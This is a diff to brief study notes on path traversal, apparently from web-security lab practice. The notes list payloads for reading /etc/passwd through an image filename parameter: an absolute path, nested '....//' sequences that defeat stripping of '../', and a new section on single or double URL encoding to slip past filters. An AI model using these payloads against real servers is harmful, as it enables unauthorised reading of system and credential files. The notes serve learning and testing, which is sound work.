@@ -7,6 +7,11 @@ If given var/www/html/images
 If given var/www/images/?filename=a.jpg
 - ->Use absolute path var/www/images/?filename=/etc/passwd
 
-# 3. Traversal sequence stripped
+# 3. Traversal sequence stripped (bypass by nested traversal)
 Use nested traversal, e.g."....//" when server block "../"
 -  ->e.g. GET /image/?filename=....//....//....//etc/passwd
+
+# 4. Traversal sequence stripped (bypass by nested URL encode)
+URL encode or double URL encode for:
+- URL path
+- filename param in multipart/form-data request
